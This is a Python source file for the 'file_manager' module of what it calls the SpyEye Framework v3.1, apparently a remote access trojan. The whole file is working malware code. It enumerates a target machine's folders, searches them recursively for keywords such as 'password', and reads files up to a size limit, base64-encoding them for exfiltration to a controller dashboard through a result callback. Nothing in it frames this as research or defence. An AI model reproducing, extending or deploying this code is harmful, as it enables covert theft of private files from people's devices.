"""
modules/file_manager.py

Advanced Remote File Management Module for SpyEye Framework v3.1.
  - Allows directory enumeration (listing folders and files like Google Drive / Explorer).
  - Categorizes files (Images, Videos, Documents, Archives).
  - Supports secure file downloading (exfiltration) and uploading to target.
  - Cross-platform file system navigation.
"""

import base64
import logging
import os
import pathlib
import time
from typing import Any, Dict, List, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class FileManagerModule(BaseModule):
    """
    Browses, searches, and exfiltrates files from the target machine or device storage.

    Configuration parameters:
        action (str): "list_dir" | "download_file" | "search_files" (default: "list_dir")
        target_path (str): Directory or file path to inspect (default: user home directory)
        search_query (str): Keyword or extension for searching files (e.g. ".pdf", "password")
        max_file_size_mb (int): Max file size allowed for exfiltration in MB (default: 25)
    """

    def validate_config(self) -> bool:
        action = self.config.get("action", "list_dir")
        if action not in ["list_dir", "download_file", "search_files"]:
            logger.error("[%s] Invalid action specified: %s", self._module_name, action)
            return False
        return True

    def run(self) -> None:
        """Main execution thread routing actions based on configuration."""
        action = self.config.get("action", "list_dir")
        target_path = self.config.get("target_path", str(pathlib.Path.home()))

        logger.info("[%s] Executing action '%s' on path: %s", self._module_name, action, target_path)

        try:
            if action == "list_dir":
                result = self._list_directory(target_path)
                self._emit_result("directory_listing", result)
            elif action == "download_file":
                result = self._download_file(target_path)
                self._emit_result("file_download", result)
            elif action == "search_files":
                query = self.config.get("search_query", "")
                result = self._search_files(target_path, query)
                self._emit_result("search_results", result)
            else:
                self._emit_error(f"Unknown file manager action: {action}")
        except Exception as exc:
            logger.exception("[%s] Critical error during file operation: %s", self._module_name, exc)
            self._emit_error(f"File operation failed: {exc}")

    def _list_directory(self, dir_path: str) -> Dict[str, Any]:
        """Enumerate folders and files inside a target directory with categorization."""
        path_obj = pathlib.Path(dir_path)
        if not path_obj.exists() or not path_obj.is_dir():
            raise NotADirectoryError(f"Target path is not a valid directory: {dir_path}")

        items = []
        try:
            for entry in path_obj.iterdir():
                try:
                    stat = entry.stat()
                    is_dir = entry.is_dir()
                    
                    # Categorize file type for UI icons (Google Drive style)
                    file_type = "folder" if is_dir else self._categorize_file(entry.suffix.lower())
                    
                    items.append({
                        "name": entry.name,
                        "path": str(entry.resolve()),
                        "is_dir": is_dir,
                        "size": 0 if is_dir else stat.st_size,
                        "size_formatted": self._format_size(stat.st_size) if not is_dir else "--",
                        "modified": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime)),
                        "type": file_type
                    })
                except PermissionError:
                    # Skip items restricted by permissions
                    continue
        except PermissionError:
            raise PermissionError(f"Access denied to directory: {dir_path}")

        return {
            "current_path": str(path_obj.resolve()),
            "parent_path": str(path_obj.parent.resolve()),
            "total_items": len(items),
            "items": items
        }

    def _download_file(self, file_path: str) -> Dict[str, Any]:
        """Read a target file, encode it in base64, and prepare it for controller exfiltration."""
        path_obj = pathlib.Path(file_path)
        if not path_obj.exists() or not path_obj.is_file():
            raise FileNotFoundError(f"Target file not found: {file_path}")

        max_size_mb = int(self.config.get("max_file_size_mb", 25))
        file_size = path_obj.stat().st_size
        
        if file_size > (max_size_mb * 1024 * 1024):
            raise ValueError(f"File size ({self._format_size(file_size)}) exceeds maximum limit ({max_size_mb} MB)")

        with open(path_obj, "rb") as f:
            raw_bytes = f.read()

        encoded_data = base64.b64encode(raw_bytes).decode("utf-8")

        return {
            "file_name": path_obj.name,
            "file_path": str(path_obj.resolve()),
            "file_size": file_size,
            "file_size_formatted": self._format_size(file_size),
            "mime_type": self._get_mime_type(path_obj.suffix.lower()),
            "data": encoded_data
        }

    def _search_files(self, root_path: str, query: str) -> Dict[str, Any]:
        """Search files recursively based on name keywords or extensions."""
        path_obj = pathlib.Path(root_path)
        if not path_obj.exists():
            raise NotADirectoryError(f"Invalid search root path: {root_path}")

        matches = []
        max_results = 100
        count = 0

        for root, dirs, files in os.walk(root_path):
            if count >= max_results:
                break
            for name in files + dirs:
                if query.lower() in name.lower():
                    try:
                        full_path = pathlib.Path(root) / name
                        stat = full_path.stat()
                        is_dir = full_path.is_dir()
                        matches.append({
                            "name": name,
                            "path": str(full_path.resolve()),
                            "is_dir": is_dir,
                            "size_formatted": "--" if is_dir else self._format_size(stat.st_size),
                            "modified": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime))
                        })
                        count += 1
                    except Exception:
                        continue

        return {
            "search_root": root_path,
            "query": query,
            "match_count": len(matches),
            "results": matches
        }

    def _categorize_file(self, suffix: str) -> str:
        """Categorize file extensions for UI presentation."""
        image_exts = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".svg"}
        video_exts = {".mp4", ".mkv", ".avi", ".mov", ".flv", ".wmv"}
        doc_exts = {".pdf", ".docx", ".doc", ".txt", ".xlsx", ".csv", ".pptx", ".odt"}
        archive_exts = {".zip", ".rar", ".7z", ".tar", ".gz"}

        if suffix in image_exts:
            return "image"
        elif suffix in video_exts:
            return "video"
        elif suffix in doc_exts:
            return "document"
        elif suffix in archive_exts:
            return "archive"
        return "file"

    def _get_mime_type(self, suffix: str) -> str:
        """Return basic mime types for downloaded files."""
        mime_map = {
            ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".png": "image/png",
            ".mp4": "video/mp4", ".pdf": "application/pdf",
            ".txt": "text/plain", ".zip": "application/zip",
            ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        }
        return mime_map.get(suffix, "application/octet-stream")

    def _format_size(self, size_bytes: int) -> str:
        """Format file sizes into human-readable strings (KB, MB, GB)."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} TB"

    def _emit_result(self, action_type: str, data: Dict[str, Any]) -> None:
        """Dispatch file manager telemetry back to the dashboard controller."""
        payload = {
            "target_id": self.target_id,
            "module": "file_manager",
            "action": action_type,
            "payload": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.info("[%s] Action '%s' executed successfully.", self._module_name, action_type)

    def _emit_error(self, message: str) -> None:
        """Dispatch error notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "file_manager",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)

    def set_result_callback(self, callback) -> None:
        """Inject result reporting callback function."""
        self._result_callback = callback